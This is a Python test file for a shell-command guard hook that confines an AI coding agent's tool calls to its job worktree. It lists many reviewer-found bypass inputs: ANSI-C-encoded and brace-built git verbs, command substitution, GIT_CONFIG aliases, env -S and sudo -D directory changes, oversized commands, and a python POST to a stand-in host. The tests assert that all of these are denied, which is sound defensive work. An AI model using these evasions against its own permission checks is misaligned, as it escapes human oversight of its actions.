    ('git -calias.save=commit save -m x', 4),
    ('GIT_DIR=' + PARENT + '/.twinlane/.git git add .', 4),
    ('git diff --output=../out', 5),
    ('curl http://127.0.0.1/a -o../out', 5),
    ('python -c "open(\'../out\',mode=\'w\').write(\'x\')"', 5),
    ('gh api repos/owner/repo/issues -ftitle=x', 6),
    ('python -c "import http.client; c=http.client.HTTPSConnection(\'example.invalid\'); '
     'c.request(\'POST\',\'/send\',\'x=1\')"', 6),
    ('git stash push', 4),
    ('git stash clear', 4),
)
# The two benign commands a review found denied, then the 19 normal forms it checked.
ROUND1_ALLOWED = (
    'cp ../template.txt ./copy.txt', 'python -c "print(\'https://example.invalid\')"',
    'python -m unittest', 'python -B -m unittest discover -s tests', 'php -l helpers/a.php',
    'vendor/bin/phpstan analyse helpers', 'npm test', 'git status', 'git diff', 'git log --oneline -10',
    'git show HEAD', 'git add a.py', 'rg -n foo helpers/', 'grep -rn foo .', 'cp a.txt b.txt', 'mv a.txt b.txt',
    'curl -s http://127.0.0.1/app/api.php?x=1', 'mkdir -p build/x', 'pytest -q', 'Get-Content a.txt',
    'echo hi > out.txt',
)


class ReviewRound1Inputs(unittest.TestCase):
    def test_the_reviewers_bypass_inputs_are_denied(self):
        for cmd, _fix in ROUND1_BYPASSES:
            self.assertIsNotNone(code(cmd), cmd)

    def test_the_false_positives_and_normal_commands_are_allowed(self):
        self.assertEqual(len(ROUND1_ALLOWED), 21)
        for cmd in ROUND1_ALLOWED:
            self.assertIsNone(code(cmd), cmd)

    def test_an_overlong_command_is_denied_unread(self):
        cmd = 'echo ' + 'a' * guard.MAX_COMMAND_CHARS
        for profile in ('intel', 'code'):
            self.assertIn('too long to inspect', guard.evaluate('Bash', bash(cmd), profile, WT, ALLOW) or '')
        self.assertIsNone(code('echo ' + 'a' * (guard.MAX_COMMAND_CHARS - 10)))
        # Under the size cap, a command that needs more scanning than MAX_WORK is denied as too complex.
        many = '; '.join(f'ls {i}' for i in range(3000))
        self.assertLess(len(many), guard.MAX_COMMAND_CHARS)
        self.assertIn('too complex to inspect', code(many) or '')


# The reviewer's reproduced inputs, with the fix
# group each depends on (1 an unfinished scan denies, 2 git config from the environment, 3 env -S / env -C).
ROUND2_BYPASSES = (
    ("python -c \"import subprocess; subprocess.run(['git'," + "'-C','.'," * 8 + "'commit','-m','x'])\"", 1),
    ("python -c \"open('../out'," + ' ' * 310 + "'w').write('x')\"", 1),
    ("python -c \"import urllib.request; urllib.request.urlopen('http://127.0.0.1/" + 'a' * 310 +
     "',data=b'x')\"", 1),
    ("GIT_CONFIG_PARAMETERS=\"'alias.save=commit'\" git save -m x", 2),
    ('GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.save GIT_CONFIG_VALUE_0=commit git save -m x', 2),
    ('env -S "git commit -m x"', 3),
    ('env -C .. cp a b', 3),
)


class ReviewRound2Inputs(unittest.TestCase):
    def test_the_reviewers_inputs_are_denied(self):
        for cmd, _fix in ROUND2_BYPASSES:
            self.assertIsNotNone(code(cmd), cmd)


# The reviewer's reproduced inputs, tagged with the fix that closes each.
ROUND3_BYPASSES = (
    ('env -S "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.save GIT_CONFIG_VALUE_0=commit git save -m x"', 'split'),
    ("python - <<'EOF'\nopen('" + './' * 200 + "../out','w').write('x')\nEOF", 'long'),
    ('sudo -D .. cp a b', 'sudo'),
    ('sudo --chdir=.. cp a b', 'sudo'),
)


class ReviewRound3Inputs(unittest.TestCase):
    def test_the_reviewers_inputs_are_denied(self):
        for cmd, _fix in ROUND3_BYPASSES:
            self.assertIsNotNone(code(cmd), cmd)

    def test_the_same_shapes_inside_the_worktree_stay_allowed(self):
        for cmd in ('env -S "git status"', 'sudo -D . cp a b', "python - <<'EOF'\nopen('out','w').write('x')\nEOF"):
            self.assertIsNone(code(cmd), cmd)


BS = chr(92)
# A configured guard section for the tests of configured rules: twinlane ships none of these names.
SCRIPT_CONFIG = {'deny_text': [r'release-prod\.ps1', r'sql[\\/]+run_\w+\.php', r'agent-run\.sh']}


def code_with(cmd, config, tool='Bash'):
    return guard.evaluate(tool, bash(cmd), 'code', WT, ALLOW, config=config)


class AnsiCQuoting(unittest.TestCase):
    """Regression: bash decodes $'...' (ANSI-C quoting), so `git $'push'` is `git push`. Only
    an unquoted $'...' is decoded; inside single or double quotes `$'` is literal text."""

    def test_encoded_verbs_paths_and_switches_are_denied(self):
        for cmd in ("git $'push' origin x", "git $'" + BS + "x70ush' origin x", "git $'" + BS + "160ush'",
                    "git $'" + BS + "u0070ush'", "$'git' push", "$'" + BS + "x67it' commit -m x",
                    "git p$'us'h", "git \"pu\"$'sh'", "git $'pu'sh", "git $'commit' -m x",
                    "cp a $'" + BS + "x2e" + BS + "x2e/x'", "cp a $'..'/x", "cp a .$'.'/x",
                    "touch $'" + BS + "056" + BS + "056/x'", "echo hi > $'" + BS + "x2e" + BS + "x2e'/x",
                    "echo hi > \"sub\"/../../x", "GIT_DIR=$'" + BS + "x2e" + BS + "x2e/x' git add .",
                    "env --ch$'dir'=.. cp a b", "env -$'" + BS + "x43' .. cp a b",
                    "git -c $'alias.x=commit' x", "git $'--work-tree'=../x checkout .",
                    "bash -c $'git" + BS + "x20push'"):
            self.assertIsNotNone(code(cmd), cmd)
        # a deploy-script text rule is a configured deny_text in twinlane
        cmd = "powershell -File scripts/release-prod$'" + BS + "x2e'ps1"
        self.assertIsNotNone(code_with(cmd, SCRIPT_CONFIG), cmd)
        self.assertIsNotNone(code(cmd), cmd)

    def test_quoted_dollars_and_harmless_ansi_c_stay_allowed(self):
        for cmd in ("cp a \"$'..'/x\"", "git log --grep \"$'push'\" -3", "printf '%s' $'a" + BS + "tb'",
                    "echo $'hello" + BS + "n' > out.txt", "cp a $'sub/b.txt'", "echo 'cost: $' > out.txt",
                    "git $'status'", f"cp a $'{WT}/b'"):
            if os.name != 'nt' and cmd.startswith('cp a "$'):
                continue  # POSIX reads the `/x` after the quote as a rooted path and denies it (stricter, kept)
            self.assertIsNone(code(cmd), cmd)
        # twinlane stays stricter than a quote-removal-only reading here: a `$` left in a destination after quote removal is read as
        # a variable it cannot resolve, so these literal names are still denied (never weakened).
        for cmd in ("cp a \"$'" + BS + "x2e" + BS + "x2e'\"/y", "cp a '$'" + BS + "x2e" + BS + "x2e'/y'"):
            self.assertIsNotNone(code(cmd), cmd)


class BraceExpansion(unittest.TestCase):
    """Regression: bash expands an unquoted {a,b} before the command runs, so a brace can hide
    a `../` or a git verb. Every word is expanded as bash does; over BRACE_CAP words is denied, never checked
    in part."""

    def test_brace_hidden_targets_and_verbs_are_denied(self):
        for cmd in ('cp a {x,../y}', 'cp a {x,{y,../z}}', 'cp a {x,y}{,/../../q}', 'echo hi > {x,../y}',
                    'mv {a,../b}', 'git {push,status}', 'git {pu,}sh', 'touch {.,..}/x',
                    'mv a {{x,y},{../z,w}}/f', "cp a {x,$'" + BS + "x2e" + BS + "x2e'}/f"):
            self.assertIsNotNone(code(cmd), cmd)

    def test_over_the_cap_is_denied_unchecked(self):
        many = 'cp a {' + ','.join(f'w{i}' for i in range(300)) + ',../out}'
        for cmd in ('cp a ' + '{a,b}' * 9 + '/x', many, 'cp a ' + '{a,b,c,d,e,f,g,h}' * 3 + '{..,z}/x',
                    'touch f{1..300}', 'cp a ' + '{x,' * 80 + 'y' + '}' * 80, 'echo ' + '{a,b}' * 40):
            self.assertIn('brace expansion', code(cmd) or '', cmd[:80])
        self.assertIn('brace expansion', guard.shell_hazard('git ' + '{a,b}' * 9) or '')

    def test_quoted_braces_and_inside_the_worktree_stay_allowed(self):
        for cmd in ('cp src/{a,b,c}.py out/', 'mkdir -p build/{x,y}/z', 'cp a.txt {b,c}.txt',
                    'echo {a,b}', 'touch file{1..5}.txt', 'touch {a..e}.log',
                    "git log --format='{%H,%s}' -3", 'echo ${HOME},x',
                    f'cp -r src/{{a,b}} {WT}/out', 'cp a {b}', 'echo {a', "awk '{print $1,$2}' a.txt",
                    'cp a {' + ','.join(f'w{i}' for i in range(256)) + '}/x', 'git stash list',
                    'git show HEAD@{1}'):
            if os.name != 'nt' and cmd == 'mkdir -p build/{x,y}/z':
                continue  # POSIX reads the `/z` after the brace as a rooted path and denies it (stricter, kept)
            self.assertIsNone(code(cmd), cmd)
        # twinlane stays strict: a quoted brace in a write position is still expanded for the
        # target check (its literal name has no `..` component, but the old rule denied it; kept).
        for cmd in ("cp a '{x,../y}'", 'cp a "{x,../y}"'):
            self.assertIsNotNone(code(cmd), cmd)
        if os.name == 'nt':  # and the backslash left of `\;` is the drive root to the path check (kept from 0.1)
            self.assertIsNotNone(code('find . -name x -exec rm {} \\;'))

    def test_expansion_is_charged_to_the_work_budget(self):
        # 8 words per brace, many braces: the expansion counts against MAX_WORK and denies as too complex.
        wide = '{' + ','.join('abcdefgh') + '}'
        many = ' '.join(['ls ' + wide * 2 + '/x'] * 400)  # 64 words each, 25 600 in all
        self.assertLess(len(many), guard.MAX_COMMAND_CHARS)
        self.assertIn('too complex to inspect', code(many) or '')
        self.assertIsNone(code('; '.join(['ls ' + wide * 2 + '/x'] * 4)))
        with mock.patch.object(guard, '_spend', wraps=guard._spend) as spend:
            self.assertIsNone(code('ls ' + wide * 2 + '/x'))
        self.assertIn(63 // 16, [c.args[2] for c in spend.call_args_list if len(c.args) > 2 and c.args[1] == ''])

    def test_words_expands_as_bash_does(self):
        self.assertEqual(guard.words('cp a{b,c{d,e}}f g'), ['cp', 'abf', 'acdf', 'acef', 'g'])
        self.assertEqual(guard.words('x {1..3} {a..c..2} {,y}'), ['x', '1', '2', '3', 'a', 'c', 'y'])
        self.assertEqual(guard.words("'{a,b}' \"{c,d}\" ${e,f} {g}"), ['{a,b}', '{c,d}', '${e,f}', '{g}'])
        self.assertEqual(guard.words("$'a" + BS + "x41" + BS + "101" + BS + "'b' '$'x'y'"), ["aAA'b", '$xy'])


class ScriptNamesInExpandedWords(unittest.TestCase):
    """Regression: the text rules (configured deny_text and twinlane's own script) read the
    words too, after brace expansion, quote removal and $'...' decoding, so a brace that bash expands into a
    denied script name is caught."""

    def test_brace_built_script_names_are_denied(self):
        for cmd in ('powershell -File release-pro{d,x}.ps1', 'powershell -File release-prod{.,_}ps1',
                    'php sql/ru{n,x}_1149_customer.php', 'bash ~/tools/agent-ru{n,x}.sh --tier small',
                    'sudo env X=1 powershell -File release-pro{d,x}.ps1',
                    'timeout 5 php sql{/,_}ru{n,x}_1.php', 'bash -c "php sql/ru{n,x}_1.php"',
                    "cmd /c \"powershell -File release-pro{d,x}.ps1\"", "bash <<'EOF'\nbash agent-ru{n,x}.sh\nEOF",
                    "powershell -File release-pro$'" + BS + "x64'{,x}.ps1", 'pwsh -File \x43:/a/{x,release-prod}.ps1',
                    'powershell -File "release-pro"d.ps1'):
            self.assertIsNotNone(code_with(cmd, SCRIPT_CONFIG), cmd)
            self.assertIsNotNone(guard.shell_hazard(cmd, SCRIPT_CONFIG), cmd)
        for cmd in ('python \x43:/x/twinlane/cli.py {run,status} --brief b', 'python src/twinlane/cli.py {land,jobs} t1'):
            self.assertIsNotNone(code(cmd), cmd)
            self.assertIsNotNone(guard.shell_hazard(cmd), cmd)

    def test_quoted_braces_and_other_scripts_stay_allowed(self):
        for cmd in ('php sql/check_{a,b}.php', 'php -l sql/ru{n,x}.txt',
                    'bash scripts/te{st,sts}.sh', 'python twinlane/cli.py {status,jobs}', "rg 'release-pro{d,x}' docs",
                    'cp src/{a,b}.ps1 build/'):
            self.assertIsNone(code_with(cmd, SCRIPT_CONFIG), cmd)
        for cmd in ("powershell -File 'release-pro{d,x}.ps1'", 'powershell -File "release-prod{.,_}ps1"',
                    'powershell -File build{,-all}.ps1'):
            self.assertIsNotNone(code_with(cmd, SCRIPT_CONFIG), cmd)


class RunTimePaths(unittest.TestCase):
    """Regression: `cp a $(echo ..)/x` was allowed, because the words split the substitution
    into `$(echo` and `..)/x` and only the harmless-looking tail was checked. A writing command whose words
    the shell computes at run time (command or process substitution, an operator parameter expansion) cannot
    be confined, so it is denied; literal quoted text and static writes stay allowed."""

    def test_writing_commands_with_run_time_words_are_denied(self):
        for cmd in ('cp a $(echo ..)/x', 'cp a $(echo ..)/{x,y}', 'cp a "$(echo ..)"/x', 'cp a `echo ..`/x',
                    'cp a ${X:-x ..}/y', 'cp $(echo -t ..) a', 'mv a $(echo ..)', 'touch $(echo ../x)',
                    'echo x > >(tee ../log)', 'echo x >(tee ../log)', 'echo hi > $(echo ..)/x',
                    'echo hi >> "$(dirname $PWD)"/x', 'Copy-Item a -Destination $(echo ..)',
                    'git $(echo push)', 'git log $(git merge-base HEAD main)..HEAD', 'git -C $(echo ..) add x',
                    'curl -o $(echo ../x) http://127.0.0.1/', 'sed -i s/a/b/ $(echo ../f)',
                    'bash -c "cp a $(echo ..)/x"'):
            self.assertIsNotNone(code(cmd), cmd)

    def test_parameter_operators_without_colon_cannot_hide_write_targets(self):
        for op in ('+', '-', '=', '?', ':+', ':-', ':=', ':?'):
            with self.subTest(operator=op):
                cmd = 'cp a ${X' + op + 'x ..}/y'
                self.assertIsNotNone(code(cmd), cmd)
        for cmd in ("cp '${X+x ..}/y' out/", "echo '${X-x ..}'", 'cp a b'):
            self.assertIsNone(code(cmd), cmd)

    def test_non_scalar_parameters_cannot_hide_write_targets(self):
        for cmd in ('ref=HOME; cp a ${!ref}/x', 'cp a ${1}/x', 'cp a $1/x',
                    'cp a ${a[ 0 ]}/x', 'cp a $@/x', 'cp a $*/x', 'cp a $#/x',
                    'cp a $?/x', 'cp a $$/x', 'cp a $!/x', 'cp a $-/x'):
            with self.subTest(command=cmd):
                self.assertIsNotNone(code(cmd), cmd)
        for cmd in ("cp '${!ref}/x' out/", "echo '$@'", 'cp "${SRC}"/a out/'):
            self.assertIsNone(code(cmd), cmd)

    def test_computed_git_options_are_denied_and_escaped_dollars_are_literal(self):
        self.assertIsNotNone(code("git log $(echo --ou''tput) $(echo ..)/out.txt"))
        self.assertIsNotNone(code('git log $(git merge-base HEAD main)..HEAD'))
        self.assertIsNone(code('cp "file' + BS + '$(date).txt" out/'))
        for n in (1, 2, 3, 4):
            for expression in ('$(date)', '`date`'):
                literal = (BS * n) + expression
                if expression.startswith('`'):
                    literal = (BS * n) + '`date' + (BS * n) + '`'
                cmd = 'cp "file' + literal + '.txt" out/'
                with self.subTest(backslashes=n, expression=expression):
                    if n % 2:
                        self.assertIsNone(code(cmd), cmd)
                    else:
                        self.assertIsNotNone(code(cmd), cmd)
        self.assertIsNone(code('cp "file<(date).txt" out/'))
        self.assertIsNone(code('cp "file>(date).txt" out/'))

    def test_computed_sed_perl_options_cannot_hide_inplace_writes(self):
        for cmd in ('sed $(printf -- -%s i) s/a/b/ $(echo ..)/x',
                    'perl $(printf -- -%s i) -pe 1 $(echo ..)/x'):
            self.assertIsNotNone(code(cmd), cmd)
        for cmd in ('sed s/a/b/ file.txt', 'perl -pe 1 file.txt'):
            self.assertIsNone(code(cmd), cmd)
        # twinlane stays strict: sed (its `w` command) and perl can write, so `..` stays denied.
        for cmd in ('sed -n 1p ../x', 'perl -ne 1 ../x'):
            self.assertIsNotNone(code(cmd), cmd)

    def test_literal_text_reads_and_static_writes_stay_allowed(self):
        for cmd in ("cp '$(echo ..)/x' out/", "cp '`x`' out/", "cp $'$(echo ..)' out/", 'echo $(date) > out.txt',
                    'echo "built $(git rev-parse HEAD)" > build/version.txt', 'printf "%s" `date` >> log.txt',
                    'ls $(git rev-parse --show-toplevel)', 'diff <(ls a) <(ls b)', 'cp a b', 'cp "${SRC}"/a out/',
                    f'cp a {WT}/b', 'cat ../x'):
            self.assertIsNone(code(cmd), cmd)
        if os.name == 'nt':
            self.assertIsNone(code('cp \x43:' + BS + 'Users' + BS + 'alice' + BS + 'x.txt sub' + BS + 'x.txt'))
        # twinlane stays strict: the arguments of a script are unknown, so a run-time word in a
        # command that may write is denied even when the redirect itself is static.
        self.assertIsNotNone(code('python x.py $(cat args.txt) > out.txt'))
        # and a redirect makes the line a writer, so its `..` operand is checked too (kept from 0.1)
        self.assertIsNotNone(code('cat ../x > out.txt'))


class HookProtocol(unittest.TestCase):
    def run_main(self, payload, env):
        out = io.StringIO()
        with mock.patch.dict(os.environ, env, clear=False), redirect_stdout(out):
            rc = guard.main(io.StringIO(json.dumps(payload)))
        return rc, out.getvalue()

    def test_silent_outside_a_twinlane_job(self):
        with mock.patch.dict(os.environ, {}, clear=False):
            os.environ.pop('TWINLANE_ENGINE_JOB', None)
            out = io.StringIO()
            with redirect_stdout(out):
                rc = guard.main(io.StringIO(json.dumps({'tool_name': 'Bash',
                                                        'tool_input': {'command': 'git push'}})))
        self.assertEqual((rc, out.getvalue()), (0, ''))

    def test_deny_json_inside_a_job(self):
        rc, out = self.run_main({'tool_name': 'Bash', 'tool_input': {'command': 'git -C . push'}},
                                {'TWINLANE_ENGINE_JOB': 'j1', 'TWINLANE_ENGINE_PROFILE': 'code', 'TWINLANE_ENGINE_CWD': WT})
        self.assertEqual(rc, 0)
        h = json.loads(out)['hookSpecificOutput']
        self.assertEqual((h['hookEventName'], h['permissionDecision']), ('PreToolUse', 'deny'))
        self.assertIn('git push', h['permissionDecisionReason'])

    def test_allowed_call_prints_nothing(self):
        rc, out = self.run_main({'tool_name': 'Bash', 'tool_input': {'command': 'git status'}},
                                {'TWINLANE_ENGINE_JOB': 'j1', 'TWINLANE_ENGINE_PROFILE': 'intel'})
        self.assertEqual((rc, out), (0, ''))

    def deny_reason(self, out):
        h = json.loads(out)['hookSpecificOutput']
        self.assertEqual(h['permissionDecision'], 'deny')
        return h['permissionDecisionReason']

    def test_garbage_input_fails_closed_inside_a_job(self):
        # An exception inside main() used to allow the call.
        for raw in ('not json', '[1, 2]'):
            with mock.patch.dict(os.environ, {'TWINLANE_ENGINE_JOB': 'j1'}):
                out = io.StringIO()
                with redirect_stdout(out):
                    self.assertEqual(guard.main(io.StringIO(raw)), 0)
            self.assertIn('guard error', self.deny_reason(out.getvalue()), raw)

    def test_an_internal_error_denies_inside_a_job(self):
        payload = {'tool_name': 'Bash', 'tool_input': {'command': 'git status'}}
        with mock.patch.object(guard, 'evaluate', side_effect=RuntimeError('boom')):
            rc, out = self.run_main(payload, {'TWINLANE_ENGINE_JOB': 'j1', 'TWINLANE_ENGINE_PROFILE': 'code',
                                              'TWINLANE_ENGINE_CWD': WT})
        self.assertEqual(rc, 0)
        self.assertIn('guard error (RuntimeError)', self.deny_reason(out))

    def test_errors_stay_silent_outside_a_job(self):
        with mock.patch.dict(os.environ, {}, clear=False):
            os.environ.pop('TWINLANE_ENGINE_JOB', None)
            out = io.StringIO()
            with redirect_stdout(out), mock.patch.object(guard, 'evaluate', side_effect=RuntimeError('boom')):
                self.assertEqual(guard.main(io.StringIO('not json')), 0)
        self.assertEqual(out.getvalue(), '')

    def test_the_shells_cwd_reaches_the_path_check(self):
        rc, out = self.run_main({'tool_name': 'Bash', 'tool_input': {'command': 'touch x'},
                                 'cwd': PARENT},
                                {'TWINLANE_ENGINE_JOB': 'j1', 'TWINLANE_ENGINE_PROFILE': 'code', 'TWINLANE_ENGINE_CWD': WT})
        self.assertIn('outside the job worktree', self.deny_reason(out))


if __name__ == '__main__':
    unittest.main()
